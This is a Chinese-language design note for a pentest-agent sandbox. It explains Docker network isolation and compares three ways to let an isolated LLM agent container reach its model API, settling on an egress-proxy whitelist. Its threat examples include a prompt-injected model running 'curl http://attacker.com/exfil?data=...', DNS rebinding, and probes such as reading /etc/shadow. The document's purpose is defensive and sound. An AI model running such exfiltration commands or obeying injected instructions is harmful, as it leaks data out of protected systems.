## 1. 为什么我们突然要聊"网络"

我们项目的沙箱设计有 7 层（ADR-004），其中最关键的两层是：

| 层 | 作用 | 类比 |
|----|------|------|
| **L3 控制层** | 代码里检查"这个目标允许打吗" | 门口的保安看名单 |
| **L6 网络层** | 系统层面"这个包发得出去吗" | 断掉网线 |

**为什么两层都要？** 因为 L3 是"软件检查"，而软件会被骗。

举个具体的骗法（DNS 重绑定）：

```
保安（L3）看到"我要去 example.com" → 查名单 → 在名单上 → 放行
但 example.com 此刻解析出来的 IP 是 192.168.1.1（未授权目标）
→ 请求真的打到了未授权目标
```

**L6 的价值就是：不管你怎么骗，网线就是不通。**

这也是为什么我们必须真的搭起容器网络，而不只是写代码检查——**L6 的验收证据只能是"物理上打不通"**。

## 2. 先认识三个基础概念

### 2.1 IP 地址与端口

```
192.168.1.10:8080
└─────┬──────┘ └┬─┘
    IP 地址     端口
  （哪台机器） （机器上的哪个服务）
```

- **IP 地址** = 门牌号，定位一台机器
- **端口** = 房间号，定位机器上的一个服务
- 一个 IP 可以有 65535 个端口，不同端口跑不同程序

### 2.2 什么是"网段"

```
192.168.1.0/24   ← 这是一个网段（一段连续的 IP）
       │
       └─ 表示 192.168.1.0 到 192.168.1.255 这 256 个地址
```

`/24` 是"掩码"，意思是"前 24 位固定"。你只需要记住：**同一个网段内的机器可以互相直接通信**。

我们的 Docker 网络会创建类似 `172.18.0.0/16` 的网段。

### 2.3 什么是 Docker 网络

**关键认知：容器不是"虚拟软件"，它本质上是一个被隔离的进程。**

那它怎么上网？答案是：**Docker 给每个网络创建了一个"虚拟交换机"**。

```
真实世界：
  你的电脑 ──── 网线 ──── 路由器 ──── 互联网

Docker 世界：
  容器A ─┐
         ├── 虚拟交换机（bridge）─── 宿主机网卡 ──── 互联网
  容器B ─┘
```

这个"虚拟交换机"在 Linux 里叫 **bridge**（网桥）。你可以把它想成"一台只有虚拟网线的交换机"。

**验证一下**（这是我们机器上的真实输出）：

```bash
$ docker network ls
NETWORK ID     NAME      DRIVER    SCOPE
5079f3508980   bridge    bridge    local      ← 默认网桥
3d868f625029   host      host      local      ← 宿主机模式
8f0d0a2c3649   none      null      local      ← 无网络模式
```

## 3. Docker 的四种网络模式（附对比图）

### 3.1 bridge（桥接模式）—— 默认

**每个容器有自己独立的 IP，通过虚拟交换机互相通信，也能出网。**

```
┌─────────────────────────── 宿主机 ────────────────────────────┐
│                                                               │
│   ┌──────────┐        ┌─────────────────┐                     │
│   │  容器 A  │        │   虚拟交换机     │                     │
│   │172.17.0.2│◄──────►│   docker0       │◄──────► 宿主机网卡   │
│   └──────────┘        │  172.17.0.1     │           │          │
│   ┌──────────┐        │                 │           ▼          │
│   │  容器 B  │◄──────►│                 │        互联网         │
│   │172.17.0.3│        └─────────────────┘                     │
│   └──────────┘                                                │
└───────────────────────────────────────────────────────────────┘

特点：能互相通信 ✅   能出网 ✅   能被外部访问（需端口映射）
```

**用途**：绝大多数正常场景。

### 3.2 host（宿主机模式）

**容器直接使用宿主机的网络，没有自己的 IP。**

```
┌─────────────────────────── 宿主机 ────────────────────────────┐
│                                                               │
│   ┌──────────────────┐                                        │
│   │     容器 A        │                                        │
│   │ 直接占用宿主机网络 │────────────► 互联网                    │
│   │  （共享 127.0.0.1）│                                       │
│   └──────────────────┘                                        │
└───────────────────────────────────────────────────────────────┘

特点：性能最好，但完全没隔离 ❌
```

**用途**：性能敏感场景。**我们的项目不能用**——因为 NFR-03 要求"Agent 无宿主机无限权限"。

### 3.3 none（无网络模式）

**容器完全没有网络。**

```
┌─────────────────────────── 宿主机 ────────────────────────────┐
│                                                               │
│   ┌──────────────────┐                                        │
│   │     容器 A        │                                        │
│   │  🚫 无任何网卡    │      ✗ 不能出网                       │
│   │  🚫 无 IP 地址    │      ✗ 不能被访问                     │
│   └──────────────────┘                                        │
└───────────────────────────────────────────────────────────────┘

特点：最安全，但也最没用——容器什么都干不了
```

**用途**：纯计算任务（比如批处理计算），或者作为"我就要绝对隔离"的极端选项。

### 3.4 自定义 bridge + `internal: true`（我们的关键）

**这是我们 L6 的核心。** 它长这样：

```
┌─────────────────────────── 宿主机 ────────────────────────────┐
│                                                               │
│   ┌─────────────── pentest-net (internal) ───────────────┐    │
│   │                                                       │    │
│   │  ┌────────────┐         ┌────────────┐               │    │
│   │  │  agent 容器 │◄───────►│  靶场容器   │               │    │
│   │  │172.20.0.2  │  可以   │172.20.0.3  │               │    │
│   │  └────────────┘  互通   └────────────┘               │    │
│   │        │                                              │    │
│   │        │ 🚫 这个网络的网关被禁用                       │    │
│   │        ▼                                              │    │
│   │     ╔══════════════╗                                  │    │
│   │     ║  打不出去！   ║                                  │    │
│   │     ╚══════════════╝                                  │    │
│   └───────────────────────────────────────────────────────┘    │
│                          ✗                                    │
│                     （无出口）                                 │
└───────────────────────────────────────────────────────────────┘

特点：容器之间能通 ✅   完全不能出网 🚫   完全不能被外部访问 🚫
```

## 4. 什么是 `internal: true`，以及它到底拦住了什么

### 4.1 技术原理（一句话版）

Docker 创建网络时，默认会给这个网络配一个**网关**（gateway），并加一条**默认路由**：

```
默认路由：  0.0.0.0/0  →  网关 172.20.0.1  →  宿主机的 NAT  →  互联网
           （意思是"所有我不知道往哪发的包，都扔给网关"）
```

`internal: true` 做的事是：**不配 NAT 规则**。结果就是：

```
包 → 网关 172.20.0.1 → 宿主机 → ❌ 没有 NAT 规则 → 丢弃
```

**网关还在，但没有出口。** 就像：房子里有门，但门外是墙。

### 4.2 它拦住了什么 / 没拦住什么

| 行为 | internal 网络下 | 说明 |
|------|----------------|------|
| 容器 A ping 容器 B（同网络） | ✅ 通 | 这是我们要的 |
| 容器 A 访问 `8.8.8.8` | 🚫 不通 | 无出口 |
| 容器 A 访问 `api.deepseek.com` | 🚫 不通 | **这就是矛盾所在** |
| 宿主机访问容器 A | 🚫 不通 | 安全（但对调试不方便）|
| 容器 A 被外部访问 | 🚫 不通 | 安全 |

### 4.3 一个常见误解

> "internet 隔离了，那容器是不是连 DNS 都查不了？"

**是的，如果 DNS 服务器在外部。** Docker 内置的 DNS（127.0.0.11）仍能让容器**解析出其他容器的名字**（这是 Docker 自己维护的），但解析公网域名会失败（因为查询包出不去）。

这一点对我们很重要：**agent 容器能解析 `target` 这个容器名，但解析不了 `api.deepseek.com`**。

## 5. 核心矛盾：沙箱要隔离，但模型要联网

### 5.1 矛盾的由来

我们的 agent 架构是：

```
┌─────────────────────────────────────────────────┐
│  pi agent 进程                                   │
│                                                  │
│   ① 把对话发给模型  ──────────────►  DeepSeek API │  ← 需要公网！
│   ② 模型返回"调用 nmap_scan"                     │
│   ③ 执行工具      ──────────────►  靶场容器       │  ← 需要内网
│   ④ 把结果发给模型  ──────────────►  DeepSeek API │  ← 又需要公网！
└─────────────────────────────────────────────────┘
```

**同一个进程，两个方向的需求：**

| 需求 | 目标 | 冲突点 |
|------|------|--------|
| L6 要求 | 只能连靶场 | 公网全断 |
| 实际要求 | 还要连 DeepSeek API | 需要出网 |

### 5.2 三种思路

解决这个矛盾，本质上只有三种思路：

| 思路 | 一句话 | 本质 |
|------|--------|------|
| **方案 1** | 给容器开两个网口 | 妥协：隔离变弱 |
| **方案 2** | 只留一个门，门口设白名单 | 折中：隔离保留，出口受限 |
| **方案 3** | 把联网的部分搬到容器外 | 彻底：容器永不联网 |

## 6. 三种解决方案的架构图对比

### 6.1 方案 1：双网络（dual network）

**思路**：给 agent 容器插两根"网线"，一根连内网，一根连外网。

```
┌───────────────────────────── 宿主机 ──────────────────────────────┐
│                                                                   │
│  ┌──────── pentest-net (internal) ────────┐                       │
│  │                                        │                       │
│  │    ┌──────────────┐   ┌────────────┐  │                       │
│  │    │  agent 容器   │◄─►│  靶场容器   │  │                       │
│  │    │              │   └────────────┘  │                       │
│  │    │  网卡1:      │                    │                       │
│  │    │  172.20.0.2  │                    │                       │
│  │    │  网卡2:      │                    │                       │
│  │    │  172.17.0.5  │                    │                       │
│  │    └──────┬───────┘                    │                       │
│  └───────────┼────────────────────────────┘                       │
│              │                                                    │
│              │ 网卡2 连到普通 bridge                                │
│              ▼                                                    │
│        ┌───────────┐                                              │
│        │ bridge0   │──────────────────────► 互联网                │
│        │172.17.0.1 │         ✅ 什么都能访问                       │
│        └───────────┘                                              │
└───────────────────────────────────────────────────────────────────┘

配置示例（docker-compose.yml）：
  agent:
    networks:
      - pentest-net    # 内网
      - outbound       # 外网

  pentest-net:
    internal: true
  outbound:
    driver: bridge
```

**优点**：
- 配置简单，Docker 原生支持
- 模型 API 正常可用

**致命缺点**：
- **网卡 2 是敞开的大门**。agent 容器可以通过 172.17.0.5 访问**任何**公网地址
- 也就是说：L6 只保证了"靶场方向"，**没保证"其他方向"**
- 攻击场景：模型被提示注入后，指挥工具 `curl http://attacker.com/exfil?data=...` → **成功外传**

**结论**：这不是"沙箱"，这是"半开的后门"。**不采用**。

---

### 6.2 方案 2：出网代理白名单（egress proxy）

**思路**：agent 容器**只有**内网网卡；想在公网方向说话，必须经过一个"门卫"——代理服务器，门卫手里有一张白名单。

```
┌────────────────────────────── 宿主机 ────────────────────────────────┐
│                                                                       │
│  ┌──────── pentest-net (internal) ──────────────────┐                 │
│  │                                                  │                 │
│  │   ┌────────────┐    ┌────────────┐              │                 │
│  │   │ agent 容器  │◄──►│  靶场容器   │              │                 │
│  │   │ 172.20.0.2 │    │ 172.20.0.3 │              │                 │
│  │   └──────┬─────┘    └────────────┘              │                 │
│  │          │                                       │                 │
│  │   唯一的出口（HTTP代理）                          │                 │
│  └──────────┼───────────────────────────────────────┘                 │
│             │                                                         │
│             ▼                                                         │
│   ┌──────────────────────┐         ┌──────────────────┐              │
│   │   代理容器（门卫）     │────────►│  bridge (可出网)  │──► 互联网    │
│   │  squid / tinyproxy    │         │   172.17.0.1     │              │
│   │                       │         └──────────────────┘              │
│   │  白名单：              │                                          │
│   │  ✅ api.deepseek.com  │──► ✅ 放行                                │
│   │  ✅ api.moonshot.cn   │──► ✅ 放行                                │
│   │  🚫 其他所有域名      │──► ❌ 拒绝                                │
│   │  🚫 裸 IP 直连        │──► ❌ 拒绝                                │
│   └──────────────────────┘                                          │
└───────────────────────────────────────────────────────────────────────┘

关键：agent 容器的网络里，除了靶场容器和代理，什么都到不了。
```

**攻击场景测试**：
```
模型被注入，指挥 curl http://attacker.com/exfil?data=xxx
  → 包发到代理
  → 代理查白名单：attacker.com 不在名单
  → ❌ 拒绝

模型指挥 nmap 内网其他 IP
  → 压根没有网卡能到
  → ❌ 不通
```

**优点**：
- **L6 完整保留**：物理上只有一条窄路
- 白名单是**可审计的**（代理日志 = 出网证据）
- 是业界标准做法（企业内网都这么干）

**缺点**：
- 多一个容器（但很小，`tinyproxy` 镜像约 10MB）
- 需要配置代理白名单（约 20 行）
- 容器内的工具要支持 `HTTP_PROXY` 环境变量（pi 的 Node fetch 支持）

**这是我们要选的方案。**

### 6.3 方案 3：模型调用外置（split architecture）

**思路**：把"联网的部分"（模型推理）放在容器**外**，容器内只留"纯工具执行"。

```
┌──────────────────────────── 宿主机 ──────────────────────────────┐
│                                                                  │
│   ┌─────────────────────────┐                                    │
│   │   宿主机进程（pi）        │                                    │
│   │                         │──────► ✅ DeepSeek API（正常出网）  │
│   │   • 管理对话历史          │                                    │
│   │   • 调用模型             │                                    │
│   │   • 决定"要调什么工具"    │                                    │
│   └───────────┬─────────────┘                                    │
│               │                                                  │
│               │ 通过 docker exec / RPC 下发指令                    │
│               ▼                                                  │
│   ┌──────── pentest-net (internal) ────────────┐                 │
│   │                                            │                 │
│   │   ┌──────────────────┐   ┌──────────────┐ │                 │
│   │   │ 工具执行容器       │◄─►│  靶场容器     │ │                 │
│   │   │（只有 nmap/curl）  │   │              │ │                 │
│   │   │ 🚫 永不出网        │   └──────────────┘ │                 │
│   │   └──────────────────┘                     │                 │
│   └────────────────────────────────────────────┘                 │
└──────────────────────────────────────────────────────────────────┘

关键：容器内从来没有"模型"这个东西，它只是个"命令执行器"。
```

**优点**：
- **隔离最彻底**：容器永远不需要网络出口
- 架构上最干净

**缺点**：
- **改动最大**：我们现在是"pi 跑在容器里，同时管模型和工具"
- 需要把 pi 拆成两半（宿主机 orchestrator + 容器 executor）
- 相当于重做一层架构，与 ADR-001 选的"pi 作为主框架"有张力
- 调试复杂：跨进程边界

**结论**：架构最优，但**成本最高**，超出 W1 时间盒。记录为 P3 演进项。

---

### 6.4 三方案总览对比

```
                隔离强度    实现成本    改动范围
方案 1 双网络      ★★☆☆☆     ★☆☆☆☆     小
方案 2 代理白名单   ★★★★☆     ★★☆☆☆     小
方案 3 模型外置     ★★★★★     ★★★★★     大
                  （越右越好）  （越左越好）

我们的选择：方案 2 —— 用最小的成本拿到接近最高的隔离
```

<a id="7"></a>
## 7. 为什么我们选方案 2

### 7.1 用项目的话说

| 判据 | 方案 2 的表现 |
|------|--------------|
| **L6 物理兜底**（ADR-004 核心） | ✅ 完整保留：只有一条窄路 |
| **R7 验收证据** | ✅ 可出示"容器内 curl 公网失败"的实测 |
| **成本** | ✅ 约半小时 + 一个 10MB 容器 |
| **可解释性**（答辩） | ✅ "白名单 egress 代理"是标准安全实践，好讲 |
| **不推翻 ADR-001** | ✅ pi 仍在容器内，架构不变 |

### 7.2 代理方案的一个额外好处

代理的**访问日志本身就是审计证据**：

```log
2026-11-03T10:23:11  ALLOW  api.deepseek.com:443
2026-11-03T10:23:45  ALLOW  api.deepseek.com:443
2026-11-03T10:24:02  DENY   attacker.com:80     ← 这一行就是 R7 的证据
```

这正好对应你的"观测性"诉求——**不只是逻辑层拦住了，物理层也留下了痕迹**。

### 7.3 需要记住的一个细节

容器内工具访问公网，需要走代理。pi 底层的 Node.js `fetch` 默认**不读** `HTTP_PROXY`，
但可以通过 `undici` 的 `ProxyAgent` 或环境变量配置实现。这一点在实现时要验证。

> **待验证项（W1-S5）**：pi/Node 在容器内通过 `HTTP_PROXY`/`HTTPS_PROXY` 走代理的可配置性。

## 8. 这套设计怎么变成验收证据

你的核心诉求是"**证明框架构建有效**"。这套网络架构能提供**分层证据**：

### 8.1 证据分层

```
R7 越界拦截验收
├─ L3 层证据（逻辑拦截）
│    audit.jsonl 中：{"decision":"deny","code":"TARGET_NOT_AUTHORIZED"}
│    ↑ 证明"控制层检查生效"
│
├─ L6 层证据（物理拦截）
│    容器内执行：curl http://192.168.1.1  →  connection timed out
│    容器内执行：curl https://baidu.com   →  connection refused
│    代理日志：  DENY attacker.com:80
│    ↑ 证明"即使控制层被绕过，也打不出去"
│
└─ L5 层证据（权限隔离）
     容器内执行：cat /etc/shadow →  permission denied
     容器内执行：touch /usr/bin/x →  read-only file system
     ↑ 证明"即使容器被攻破，也伤不到宿主"
```

### 8.2 为什么这种"分层证据"有说服力

因为**任何单层都可能被质疑**：

| 质疑 | 单层证据的困境 | 分层证据的回答 |
|------|--------------|--------------|
| "你的控制层有 bug 呢？" | 无法反驳 | "有 bug 也没用，L6 物理层不通" |
| "你的网络隔离是不是配错了？" | 无法证明 | "这是实测 curl 失败输出 + 代理 DENY 日志" |
| "容器被攻破了怎么办？" | 无法回答 | "L5 只读 + 非 root，实测 /etc/shadow 读不到" |

这正是 ADR-004 §8 说的"**分层出示，答辩说服力远胜单层**"。

### 8.3 对 W1 的直接影响

这意味着 W1 不只是"把 docker 跑起来"，而是要**逐层留证**：

| W1 步骤 | 必须留的证据 |
|---------|-------------|
| S3 起 compose | `docker network inspect` 输出（证明 internal） |
| S4 连通性 | agent → 靶场成功；agent → 公网失败的**原始输出** |
| S5 代理 | 代理日志 ALLOW/DENY 各一条 |
| S6 对抗 | R7 用例：容器内直连未授权 IP 的失败输出 |

### 8.4 与现有代码的对应（代码侧的观测骨架已存在）

本文第 8 节的"分层证据"是**网络层视角**；代码侧的证据骨架已由
`src/pi-pentest/src/observability.ts` 提供：

| 概念 | 代码位置 | 作用 |
|------|---------|------|
| 运行级元数据盖章（runId / arm / configHash） | `RunMeta`、`computeConfigHash()` | 防止对照实验版本漂移 |
| 原始 Observation 与产物落盘 | `ObservationStore` → `observation_ref` / `artifact_ref` | 支持逐条回溯 |
| 观测完整度（与漏洞四态独立） | `TraceHealth`（COMPLETE / DEGRADED / MISSING） | 承认"证据没采全"也是事实 |
| 对照实验分组 | `Arm`（on / off / unset） | 证明"有裁决 vs 无裁决"差异 |

**两层证据合起来才完整**：网络层证明"物理打不出去"（本文§8.1 的 L6），
代码层证明"每次决策与产出都可回溯"（`observability.ts`）。
两者在验收文档中分别对应 R7（拦截）与 R5（证据链）。

## 9. 名词表

| 名词 | 通俗解释 |
|------|---------|
| **bridge（网桥）** | Docker 的虚拟交换机，容器通过它互相通信 |
| **internal network** | 一个"有门但门外是墙"的网络，容器之间能通，但出不去 |
| **NAT** | 网络地址转换，让内网机器共用一个公网 IP 上网；`internal` 就是禁用它的 |
| **gateway（网关）** | 网络里的"出口"，所有去往外部的包先发给它 |
| **egress** | 出站流量（从内往外）。与之相对是 ingress（入站） |
| **egress proxy** | 出站代理：所有出网请求必须经过它，它可以按白名单放行/拒绝 |
| **HTTP_PROXY 环境变量** | 告诉程序"你要上网就先连这个代理"的约定 |
| **squid / tinyproxy** | 两个常用的轻量代理软件（我们计划用 tinyproxy，更小更简单） |
| **网卡（network interface）** | 机器上的"网线插口"，一个容器可以有多张 |
| **DNS 重绑定** | 一种攻击：让域名先解析到合法 IP 通过检查，再解析到非法 IP 发起真实请求 |
| **read-only rootfs** | 容器的根文件系统只读，防止被写入后门 |
| **cap-drop ALL** | 剥夺容器的所有 Linux 特权能力 |
